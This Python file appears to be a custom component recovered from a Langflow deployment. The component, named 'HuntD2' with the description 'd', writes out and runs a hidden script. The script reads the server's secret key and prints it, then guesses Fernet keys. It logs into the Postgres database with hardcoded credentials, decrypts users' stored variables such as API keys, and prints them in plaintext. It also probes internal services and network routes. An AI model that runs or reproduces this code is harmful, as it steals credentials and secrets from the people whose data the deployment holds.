# Recovered Langflow component
# type: HuntD2
# class: HuntD2
# used in 2 flow(s): hd2, hd2 (1)
# json path: node.data.node.template.code.value


from langflow.custom import Component
from langflow.io import Output, MessageTextInput
from langflow.schema.message import Message
import subprocess
class HuntD2(Component):
    display_name="HuntD2"
    description="d"
    icon="code"
    name="HuntD2"
    inputs=[MessageTextInput(name="input_value", display_name="Input", value="x")]
    outputs=[Output(name="output", display_name="Output", method="build_out")]
    def build_out(self) -> Message:
        open("/tmp/hd2.py","w").write('\nimport os, subprocess, socket, urllib.request, ssl, base64, hashlib\nprint("FIND_CODE")\nprint(subprocess.getoutput("find /app -name \'*.py\' 2>/dev/null | xargs grep -l \'Fernet\\\\|encrypt_api_key\\\\|def encrypt\\\\|SECRET_KEY\' 2>/dev/null | head -30"))\nprint("GREP")\nprint(subprocess.getoutput("grep -Rn \'Fernet\\\\|encrypt_api_key\\\\|decrypt_api_key\\\\|get_fernet\\\\|SECRET_KEY\' /app/src /app/langflow 2>/dev/null | head -60"))\n# try import langflow crypto helpers\nfor path in [\n "langflow.services.auth.utils",\n "langflow.services.database.models.variable.model",\n "langflow.services.variable.service",\n "langflow.services.auth.service",\n "langflow.utils.util",\n]:\n    try:\n        m=__import__(path, fromlist=[\'*\'])\n        print("IMP", path, [x for x in dir(m) if \'crypt\' in x.lower() or \'fernet\' in x.lower() or \'secret\' in x.lower() or \'encrypt\' in x.lower() or \'decrypt\' in x.lower()])\n    except Exception as e:\n        print("IMPFAIL", path, e)\n\nsecret=open("/app/langflow/secret_key").read().strip()\nprint("SECRET", secret)\nfrom cryptography.fernet import Fernet\n# try langflow style: base64 urlsafe of secret padded/truncated to 32\nimport hashlib\ncands=[]\n# 1 sha256\ncands.append(("sha256", base64.urlsafe_b64encode(hashlib.sha256(secret.encode()).digest())))\n# 2 md5 double?\ncands.append(("md5pad", base64.urlsafe_b64encode(hashlib.md5(secret.encode()).digest()*2)))\n# 3 first 32 bytes of secret padded\nraw=secret.encode()\nif len(raw)<32: raw=raw.ljust(32,b\'0\')\nelse: raw=raw[:32]\ncands.append(("pad32", base64.urlsafe_b64encode(raw)))\n# 4 passlib style\ntry:\n    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\n    from cryptography.hazmat.primitives import hashes\n    kdf=PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=b"langflow", iterations=100000)\n    cands.append(("pbkdf", base64.urlsafe_b64encode(kdf.derive(secret.encode()))))\nexcept Exception as e:\n    print("pbkdf err", e)\n\nimport psycopg2\nconn=psycopg2.connect("postgresql://myuser:mypassword@postgres:5432/langflow")\ncur=conn.cursor()\ncur.execute("select name,value,type,user_id::text from variable")\nrows=cur.fetchall()\nok=0\nfor name,value,typ,uid in rows:\n    if not value: continue\n    for tag,key in cands:\n        try:\n            dec=Fernet(key).decrypt(value.encode()).decode()\n            print("OK", tag, name, uid[:8], "=>", dec)\n            ok+=1\n            break\n        except Exception:\n            pass\nprint("DECRYPTED", ok, "of", len(rows))\n# ollama models full\nctx=ssl._create_unverified_context()\nfor u in ["http://ollama:11434/api/tags","https://ollama.aitgpt.dev.brain.cs.ait.ac.th/api/tags"]:\n    try:\n        r=urllib.request.urlopen(u,context=ctx,timeout=6); print("OLLAMA", u, r.read(800).decode())\n    except Exception as e:\n        print("OLLAMA", u, e)\n# adminer via internal\ntry:\n    r=urllib.request.urlopen("http://adminer/", timeout=5); print("ADMINER", r.status, r.read(200))\nexcept Exception as e:\n    print("ADMINER", e)\nprint("IP_ROUTE", subprocess.getoutput("ip route | head; cat /etc/hosts"))\n')
        return Message(text=subprocess.getoutput("python /tmp/hd2.py"))
